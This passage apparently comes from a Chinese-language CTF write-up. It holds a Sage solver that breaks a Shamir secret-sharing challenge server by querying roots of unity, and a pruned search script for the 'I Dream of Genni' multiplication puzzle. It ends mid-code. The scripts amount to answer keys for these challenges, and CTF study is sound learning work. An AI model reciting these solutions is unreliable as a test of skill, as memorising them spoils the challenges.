<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Configuration ---</span></span><br><span class="line">HOST = <span class="string">&quot;ssss.chals.sekai.team&quot;</span></span><br><span class="line">PORT = <span class="number">1337</span></span><br><span class="line">P_VAL = <span class="number">2</span>**<span class="number">256</span> - <span class="number">189</span></span><br><span class="line">DEGREE = <span class="number">28</span></span><br><span class="line">N_POINTS = DEGREE + <span class="number">1</span>  <span class="comment"># 29</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment">#  Part 1: A stable, standard library-based SSL socket wrapper</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SafeRemote</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A robust socket wrapper using Python&#x27;s standard ssl library.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, address, timeout=<span class="number">10</span></span>):</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(timeout)</span><br><span class="line">        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)</span><br><span class="line">        context.check_hostname = <span class="literal">True</span></span><br><span class="line">        context.verify_mode = ssl.CERT_REQUIRED</span><br><span class="line">        context.load_default_certs()</span><br><span class="line">        self.wrapped_sock = context.wrap_socket(self.sock, server_hostname=address[<span class="number">0</span>])</span><br><span class="line">        self.wrapped_sock.connect(address)</span><br><span class="line">        self.f = self.wrapped_sock.makefile(<span class="string">&#x27;rw&#x27;</span>, buffering=<span class="number">1</span>)</span><br><span class="line">        tqdm.write(<span class="string">f&quot;[*] Securely connected to <span class="subst">&#123;address[<span class="number">0</span>]&#125;</span>:<span class="subst">&#123;address[<span class="number">1</span>]&#125;</span>.&quot;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvline</span>(<span class="params">self</span>):</span><br><span class="line">        line = self.f.readline()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="keyword">raise</span> EOFError(<span class="string">&quot;Connection closed by server while waiting for a line.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> line.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sendline</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">            data = <span class="built_in">str</span>(data)</span><br><span class="line">        self.f.write(data + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.f.close()</span><br><span class="line">            self.wrapped_sock.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment">#  Part 2: Logic to get candidates and optionally submit the secret</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">perform_challenge</span>(<span class="params">io, challenge_num, secret_to_submit=<span class="literal">None</span></span>):</span><br><span class="line">    tqdm.write(<span class="string">f&quot;[*] Executing Challenge <span class="subst">&#123;challenge_num&#125;</span>...&quot;</span>, file=sys.stderr)</span><br><span class="line">    </span><br><span class="line">    F = GF(P_VAL)</span><br><span class="line">    g = F.multiplicative_generator()</span><br><span class="line">    w = g^((P_VAL - <span class="number">1</span>) // N_POINTS)</span><br><span class="line">    </span><br><span class="line">    io.sendline(N_POINTS)</span><br><span class="line">    tqdm.write(<span class="string">f&quot;    [+] Sent t=<span class="subst">&#123;N_POINTS&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">    </span><br><span class="line">    y_values = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(N_POINTS), desc=<span class="string">&quot;    [+] Exchanging points&quot;</span>, leave=<span class="literal">False</span>, file=sys.stderr):</span><br><span class="line">        io.sendline(<span class="built_in">int</span>(w^k))</span><br><span class="line">        y_str = io.recvline()</span><br><span class="line">        y_values.append(F(<span class="built_in">int</span>(y_str)))</span><br><span class="line">    </span><br><span class="line">    tqdm.write(<span class="string">&quot;    [+] All points received.&quot;</span>, file=sys.stderr)</span><br><span class="line">    </span><br><span class="line">    invN = F(<span class="number">1</span>)/N_POINTS</span><br><span class="line">    coeffs = <span class="built_in">set</span>(<span class="built_in">int</span>(<span class="built_in">sum</span>(y_values[k] * w^(-m * k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(N_POINTS)) * invN) <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(N_POINTS))</span><br><span class="line">    tqdm.write(<span class="string">f&quot;    [+] Recovered <span class="subst">&#123;<span class="built_in">len</span>(coeffs)&#125;</span> candidates for this challenge.&quot;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we have a secret to submit, send it. Otherwise, send a dummy guess.</span></span><br><span class="line">    <span class="keyword">if</span> secret_to_submit <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        tqdm.write(<span class="string">f&quot;    [+] Submitting final secret: <span class="subst">&#123;<span class="built_in">hex</span>(secret_to_submit)&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        io.sendline(secret_to_submit)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tqdm.write(<span class="string">&quot;    [+] Sending dummy guess to continue to next challenge.&quot;</span>, file=sys.stderr)</span><br><span class="line">        io.sendline(<span class="number">0</span>)</span><br><span class="line">        io.recvline() <span class="comment"># Consume the &#x27;:&lt;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> coeffs</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment">#  Part 3: Main solver logic with in-place submission</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- Solver Started: Using In-Place Submission Strategy ---&quot;</span>, file=sys.stderr)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Establish ONE connection for all operations</span></span><br><span class="line">        io = SafeRemote((HOST, PORT))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># --- Challenge 1: Just gather candidates ---</span></span><br><span class="line">        candidates_1 = perform_challenge(io, <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># --- Challenge 2: Gather candidates AND submit the answer ---</span></span><br><span class="line">        tqdm.write(<span class="string">f&quot;[*] Executing Challenge 2 (and preparing to submit)...&quot;</span>, file=sys.stderr)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># We need to get the second set of candidates before we can find the secret</span></span><br><span class="line">        F = GF(P_VAL)</span><br><span class="line">        g = F.multiplicative_generator()</span><br><span class="line">        w = g^((P_VAL - <span class="number">1</span>) // N_POINTS)</span><br><span class="line">        </span><br><span class="line">        io.sendline(N_POINTS)</span><br><span class="line">        tqdm.write(<span class="string">f&quot;    [+] Sent t=<span class="subst">&#123;N_POINTS&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        </span><br><span class="line">        y_values_2 = []</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(N_POINTS), desc=<span class="string">&quot;    [+] Exchanging points&quot;</span>, leave=<span class="literal">False</span>, file=sys.stderr):</span><br><span class="line">            io.sendline(<span class="built_in">int</span>(w^k))</span><br><span class="line">            y_str = io.recvline()</span><br><span class="line">            y_values_2.append(F(<span class="built_in">int</span>(y_str)))</span><br><span class="line">        </span><br><span class="line">        tqdm.write(<span class="string">&quot;    [+] All points for Challenge 2 received.&quot;</span>, file=sys.stderr)</span><br><span class="line">        </span><br><span class="line">        invN = F(<span class="number">1</span>)/N_POINTS</span><br><span class="line">        candidates_2 = <span class="built_in">set</span>(<span class="built_in">int</span>(<span class="built_in">sum</span>(y_values_2[k] * w^(-m * k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(N_POINTS)) * invN) <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(N_POINTS))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># --- Now, find the secret and submit it IMMEDIATELY ---</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[*] Calculating intersection and submitting...&quot;</span>, file=sys.stderr)</span><br><span class="line">        intersection = candidates_1.intersection(candidates_2)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(intersection) != <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[-] Error: Expected exactly one common secret, but found <span class="subst">&#123;<span class="built_in">len</span>(intersection)&#125;</span>. Aborting.&quot;</span>, file=sys.stderr)</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        final_secret = intersection.pop()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    [+] Unique secret found: <span class="subst">&#123;<span class="built_in">hex</span>(final_secret)&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    [+] Submitting final secret NOW.&quot;</span>, file=sys.stderr)</span><br><span class="line">        io.sendline(final_secret)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># --- Receive the Flag ---</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">40</span>, file=sys.stderr)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!! SERVER RESPONSE (FLAG) !!!&quot;</span>, file=sys.stderr)</span><br><span class="line">        response = io.recvline()</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">40</span>, file=sys.stderr)</span><br><span class="line">        </span><br><span class="line">        io.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[!] An unexpected error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        <span class="keyword">import</span> traceback</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h1 id="I-Dream-of-Genni"><a href="#I-Dream-of-Genni" class="headerlink" title="I Dream of Genni"></a>I Dream of Genni</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">x = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter an 8-digit multiplicand: &#x27;</span>))</span><br><span class="line">y = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter a 7-digit multiplier: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">1e6</span> &lt;= y &lt; <span class="number">1e7</span> &lt;= x &lt; <span class="number">1e8</span>, <span class="string">&quot;Incorrect lengths&quot;</span></span><br><span class="line"><span class="keyword">assert</span> x * y != <span class="number">3_81_40_42_24_40_28_42</span>, <span class="string">&quot;Insufficient ntr-opy&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dream_multiply</span>(<span class="params">x, y</span>):</span><br><span class="line">    x, y = <span class="built_in">str</span>(x), <span class="built_in">str</span>(y)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(x) == <span class="built_in">len</span>(y) + <span class="number">1</span></span><br><span class="line">    digits = x[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(x[<span class="number">1</span>:], y):</span><br><span class="line">        digits += <span class="built_in">str</span>(<span class="built_in">int</span>(a) * <span class="built_in">int</span>(b))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(digits)</span><br><span class="line"><span class="keyword">assert</span> dream_multiply(x, y) == x * y, <span class="string">&quot;More like a nightmare&quot;</span></span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;75bd1089b2248540e3406aa014dc2b5add4fb83ffdc54d09beb878bbb0d42717e9cc6114311767dd9f3b8b070b359a1ac2eb695cd31f435680ea885e85690f89&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(AES.new(sha256(<span class="built_in">str</span>((x, y)).encode()).digest(), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(ct)).decode())</span><br></pre></td></tr></table></figure>

<p>找出另一组能够满足“梦想乘法”的7位数和8位数，直接剪枝吧，但是我的脚本蛮慢，学习一下其他师傅的快速脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">CT = <span class="string">&#x27;75bd1089b2248540e3406aa014dc2b5add4fb83ffdc54d09beb878bbb0d42717e9cc6114311767dd9f3b8b070b359a1ac2eb695cd31f435680ea885e85690f89&#x27;</span></span><br><span class="line">EXCLUDED = <span class="number">381404224402842</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们的位索引约定（与原题数字位位置一致）：</span></span><br><span class="line"><span class="comment"># x = x0 x1 x2 x3 x4 x5 x6 x7   (x0 是最高位, x7 最低位)</span></span><br><span class="line"><span class="comment"># y = y0 y1 y2 y3 y4 y5 y6      (y0 最高位, y6 最低位)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LSD 搜索时，我们先确定块 (x7*y6) 作为 dream 的最低块，接着 (x6*y5), ..., 最后 (x1*y0)。</span></span><br><span class="line"><span class="comment"># 块序(低到高) 索引 k: 0..6 对应 (x_&#123;7-k&#125;, y_&#123;6-k&#125;)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 在已知低位位数 t 时，已知的 x 低位 digits 列表 lx: lx[0]=x7, lx[1]=x6, ...</span></span><br><span class="line"><span class="comment"># 同理 ly: ly[0]=y6, ly[1]=y5, ...</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># dream 尾串 = 拼接已确定块（从高到低反转）后的字符串；</span></span><br><span class="line"><span class="comment"># 将其按低位数字顺序拆成 digit 数组 D (D[0] 为最末位)。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">########################################################################</span></span><br><span class="line"><span class="comment"># 生成 (a,b) 候选</span></span><br><span class="line"><span class="comment">########################################################################</span></span><br><span class="line"></span><br><span class="line">two_digit_pairs = [(a, b, a*b, <span class="built_in">str</span>(a*b)) <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10</span>) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">10</span>) <span class="keyword">if</span> a*b &gt;= <span class="number">10</span>]</span><br><span class="line"><span class="comment"># 按乘积值从大到小，提高冲突剪枝概率</span></span><br><span class="line">two_digit_pairs.sort(key=<span class="keyword">lambda</span> x: -x[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">one_digit_pairs = [(a, b, a*b, <span class="built_in">str</span>(a*b)) <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>) <span class="keyword">if</span> a*b &lt;= <span class="number">9</span>]</span><br><span class="line"><span class="comment"># 同样可按乘积值排序（大的一位数优先）</span></span><br><span class="line">one_digit_pairs.sort(key=<span class="keyword">lambda</span> x: -x[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">########################################################################</span></span><br><span class="line"><span class="comment"># 低位 carry DP 剪枝</span></span><br><span class="line"><span class="comment">########################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tail_digits_from_blocks</span>(<span class="params">blocks_low_to_high: <span class="built_in">list</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;blocks_low_to_high: 低位到高位的块字符串；拼接成 tail 再转低位 digits 列表&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> blocks_low_to_high:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    s = <span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(blocks_low_to_high))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">reversed</span>(s)))  <span class="comment"># D[0] 低位</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_known_and_unknown_bounds</span>(<span class="params">lx: <span class="built_in">list</span>[<span class="built_in">int</span>], ly: <span class="built_in">list</span>[<span class="built_in">int</span>], L_tail: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算:</span></span><br><span class="line"><span class="string">      known_sum[e]: 所有已知对 (xi,yj) 且 i+j=e 的 xi*yj 之和</span></span><br><span class="line"><span class="string">      U_e_max[e]:   位 e 可能由尚未确定的对贡献的最大增量上界 (使用 81 保守估计)</span></span><br><span class="line"><span class="string">    这里只对 e &lt; L_tail 的低位关心。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    t = <span class="built_in">len</span>(lx)</span><br><span class="line">    max_e = L_tail - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> max_e &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [], []</span><br><span class="line">    known_sum = [<span class="number">0</span>]*(max_e+<span class="number">1</span>)</span><br><span class="line">    U_e_max  = [<span class="number">0</span>]*(max_e+<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 已知对：i&lt; t, j&lt; t</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">            e = i + j</span><br><span class="line">            <span class="keyword">if</span> e &lt;= max_e:</span><br><span class="line">                known_sum[e] += lx[i]*ly[j]</span><br><span class="line">    <span class="comment"># 未知对：只统计 (i,j) 尚未被双方同时确定的那些</span></span><br><span class="line">    <span class="comment"># 我们按实际上限所有 (i,j) i&lt;8, j&lt;7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">            e = i + j</span><br><span class="line">            <span class="keyword">if</span> e &gt; max_e:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 若这个对完全已知则跳过</span></span><br><span class="line">            <span class="keyword">if</span> i &lt; t <span class="keyword">and</span> j &lt; t:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 上界：81</span></span><br><span class="line">            U_e_max[e] += <span class="number">81</span></span><br><span class="line">    <span class="keyword">return</span> known_sum, U_e_max</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">carry_feasible</span>(<span class="params">digits: <span class="built_in">list</span>[<span class="built_in">int</span>], lx: <span class="built_in">list</span>[<span class="built_in">int</span>], ly: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    逐位（真实乘积的低位 -&gt; 高位）DP 判断：是否存在未知对的贡献选择</span></span><br><span class="line"><span class="string">    使得低 L_tail 位可以匹配 dream 尾串 digits。</span></span><br><span class="line"><span class="string">    digits: D[e] (e=0..L_tail-1)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    L_tail = <span class="built_in">len</span>(digits)</span><br><span class="line">    <span class="keyword">if</span> L_tail == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    known_sum, U_e_max = build_known_and_unknown_bounds(lx, ly, L_tail)</span><br><span class="line">    <span class="comment"># possible carries 用区间集合表示（初始只有 0）</span></span><br><span class="line">    carry_min = <span class="number">0</span></span><br><span class="line">    carry_max = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(L_tail):</span><br><span class="line">        d = digits[e]</span><br><span class="line">        S_known = known_sum[e]</span><br><span class="line">        Umax = U_e_max[e]</span><br><span class="line">        new_carry_min = <span class="literal">None</span></span><br><span class="line">        new_carry_max = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># 我们有 carry_in ∈ [carry_min, carry_max]</span></span><br><span class="line">        <span class="comment"># 对每个可能的 carry_in 需要存在 k ∈ [0,Umax] s.t.</span></span><br><span class="line">        <span class="comment"># (S_known + k + carry_in) % 10 == d</span></span><br><span class="line">        <span class="comment"># 令 R = (d - (S_known + carry_in)) mod 10 -&gt; 最小 k0 = R</span></span><br><span class="line">        <span class="comment"># 若 k0 &gt; Umax -&gt; 不可</span></span><br><span class="line">        <span class="comment"># 若可，k 可为 k0 + 10t ≤ Umax，产生的 carry_out = (S_known + carry_in + k)/10</span></span><br><span class="line">        <span class="comment"># carry_out 的最小来自最小 k（k0），最大来自最大 k (k0 + 10*floor((Umax-k0)/10))</span></span><br><span class="line">        <span class="keyword">for</span> carry_in <span class="keyword">in</span> <span class="built_in">range</span>(carry_min, carry_max+<span class="number">1</span>):</span><br><span class="line">            base = S_known + carry_in</span><br><span class="line">            R = (d - (base % <span class="number">10</span>)) % <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> R &gt; Umax:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 最小合法 k</span></span><br><span class="line">            k_min = R</span><br><span class="line">            <span class="comment"># 最大合法 k</span></span><br><span class="line">            tmax = (Umax - R)//<span class="number">10</span></span><br><span class="line">            k_max = R + <span class="number">10</span>*tmax</span><br><span class="line">            <span class="comment"># 计算 carry_out 区间</span></span><br><span class="line">            co_min = (base + k_min)//<span class="number">10</span></span><br><span class="line">            co_max = (base + k_max)//<span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> new_carry_min <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> co_min &lt; new_carry_min:</span><br><span class="line">                new_carry_min = co_min</span><br><span class="line">            <span class="keyword">if</span> new_carry_max <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> co_max &gt; new_carry_max:</span><br><span class="line">                new_carry_max = co_max</span><br><span class="line">        <span class="keyword">if</span> new_carry_min <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        carry_min, carry_max = new_carry_min, new_carry_max</span><br><span class="line">        <span class="comment"># 可选：限制 carry 上界（理论上不会太大）；保守不裁剪</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">########################################################################</span></span><br><span class="line"><span class="comment"># 主 DFS</span></span><br><span class="line"><span class="comment">########################################################################</span></span><br><span class="line"></span><br><span class="line">solutions = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_mode</span>(<span class="params">all_two_digit: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params">                single_pos: <span class="built_in">int</span> | <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                continue_search: <span class="built_in">bool</span>,</span></span><br><span class="line"><span class="params">                show_progress: <span class="built_in">bool</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    all_two_digit = True  : k=7 模式</span></span><br><span class="line"><span class="string">    all_two_digit = False : k=6 模式, single_pos 指定哪一个块(0..6, 低位=0) 为单一位积</span></span><br><span class="line"><span class="string">    single_pos: 块索引（低位=0)；只有在 all_two_digit=False 时使用</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mode_desc = <span class="string">&quot;k=7(all 2-digit)&quot;</span> <span class="keyword">if</span> all_two_digit <span class="keyword">else</span> <span class="string">f&quot;k=6(single at block <span class="subst">&#123;single_pos&#125;</span>)&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[MODE] <span class="subst">&#123;mode_desc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 预准备第一层候选（最低块）；根据模式决定允许集合</span></span><br><span class="line">    <span class="keyword">if</span> all_two_digit:</span><br><span class="line">        first_candidates = two_digit_pairs</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 若最低块恰好是 single_pos，则用一位集合，否则两位</span></span><br><span class="line">        first_candidates = one_digit_pairs <span class="keyword">if</span> single_pos == <span class="number">0</span> <span class="keyword">else</span> two_digit_pairs</span><br><span class="line"></span><br><span class="line">    pbar = tqdm(first_candidates, desc=<span class="string">&quot;First block&quot;</span>, disable=<span class="keyword">not</span> show_progress)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 为减少重复，可使用集合记录已探索某些前缀状态 (可选，这里不做以保持清晰)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">block_index: <span class="built_in">int</span>,</span></span><br><span class="line"><span class="params">            blocks_low_to_high: <span class="built_in">list</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">            lx: <span class="built_in">list</span>[<span class="built_in">int</span>], ly: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">        <span class="comment"># 已放置块数 block_index</span></span><br><span class="line">        <span class="comment"># 长度判断</span></span><br><span class="line">        t_blocks = block_index  <span class="comment"># 已确定的块数</span></span><br><span class="line">        tail_str = <span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>(blocks_low_to_high))</span><br><span class="line">        L_tail = <span class="built_in">len</span>(tail_str)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 已放块数 = t_blocks, 剩余 r = 7 - t_blocks</span></span><br><span class="line">        r = <span class="number">7</span> - t_blocks</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 当前已使用的一位块数</span></span><br><span class="line">        single_used = <span class="number">0</span> <span class="keyword">if</span> all_two_digit <span class="keyword">else</span> <span class="number">1</span>  <span class="comment"># 在 k=6 模式里我们强制 exactly one; 进入 DFS 时已默认包含 single_pos 之前的统计</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> all_two_digit:</span><br><span class="line">            <span class="comment"># 统计当前 blocks_low_to_high 中是否已经包含 single_pos 位置的一位块</span></span><br><span class="line">            <span class="comment"># 不计数其它（因为其它位置不能是一位块）</span></span><br><span class="line">            <span class="comment"># 简化：到调用 dfs 时，已经严格按照模式过滤了候选，不需要重复判断</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 目标长度:</span></span><br><span class="line">        <span class="comment">#  - k=7 -&gt; dream 总长应=15</span></span><br><span class="line">        <span class="comment">#  - k=6 -&gt; dream 总长应=14</span></span><br><span class="line">        target_total_len = <span class="number">15</span> <span class="keyword">if</span> all_two_digit <span class="keyword">else</span> <span class="number">14</span></span><br><span class="line">        <span class="comment"># 当前 dream 总长 = 1 (x0) + L_tail</span></span><br><span class="line">        current_total_min = <span class="number">1</span> + L_tail + r*<span class="number">1</span></span><br><span class="line">        current_total_max = <span class="number">1</span> + L_tail + r*<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> current_total_min &gt; target_total_len <span class="keyword">or</span> current_total_max &lt; target_total_len:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 低位 carry DP 剪枝（只针对已经有尾部的情况）</span></span><br><span class="line">        <span class="keyword">if</span> L_tail &gt; <span class="number">0</span>:</span><br><span class="line">            digits = <span class="built_in">list</span>(<span class="built_in">map</span>(<span 